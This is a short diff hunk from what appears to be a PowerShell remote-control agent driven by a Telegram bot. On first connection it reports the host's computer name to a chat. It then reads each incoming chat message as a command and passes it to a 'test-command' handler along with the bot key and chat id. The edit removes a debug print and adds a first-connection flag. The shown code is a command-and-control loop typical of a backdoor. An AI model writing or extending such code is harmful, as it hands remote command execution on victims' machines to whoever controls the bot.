@@ -48,8 +48,7 @@ if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mens
 	while ($i -lt $l) {
 		$offset = $json.result[$i].update_id + 1
         $comando = $json.result[$i].message.text
-        Write-Host $comando
-test-command -comando $comando -botkey $botkey -chat_id $chat_id 
+        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
    		$i++
 	}
 
